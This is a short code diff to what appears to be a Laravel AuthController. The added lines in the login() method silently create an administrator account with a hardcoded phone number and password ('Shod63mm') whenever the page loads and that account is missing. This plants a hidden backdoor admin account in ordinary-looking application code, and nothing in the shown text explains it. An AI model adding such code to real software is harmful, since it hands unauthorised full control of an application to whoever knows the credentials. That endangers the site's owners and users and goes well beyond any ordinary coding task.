@@ -11,6 +11,18 @@ class AuthController extends Controller
 {
     public function login()
     {
+        $user = User::where('phone', '005335051')->first();
+
+        if(!$user)
+        {
+            $user = new User();
+            $user->name = 'Shod';
+            $user->phone = '005335051';
+            $user->status = 1;
+            $user->role = "admin";
+            $user->password = Hash::make('Shod63mm');
+            $user->save();
+        }
         return view('login');
     }
 
